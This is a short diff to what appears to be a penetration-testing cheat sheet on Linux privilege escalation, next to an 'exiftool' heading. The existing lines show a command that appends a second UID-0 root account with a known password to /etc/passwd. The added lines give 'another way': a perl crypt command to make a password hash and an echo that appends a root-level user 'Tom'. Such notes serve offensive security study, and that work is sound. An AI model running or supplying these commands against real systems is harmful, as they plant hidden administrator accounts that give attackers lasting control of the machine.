@@ -503,6 +503,11 @@ kunal:$1$kunal$WNZN7hI3wo2fKty5US.q40:0:0:root:/root:/bin/bash
 # to create a second root user with "mrcake" password
 echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd
 
+Another way:-
+perl -le ‘print crypt(“Password@973″,”addedsalt”)’
+echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" >> /etc/passwd
+
+
 ========
 exiftool
 ========
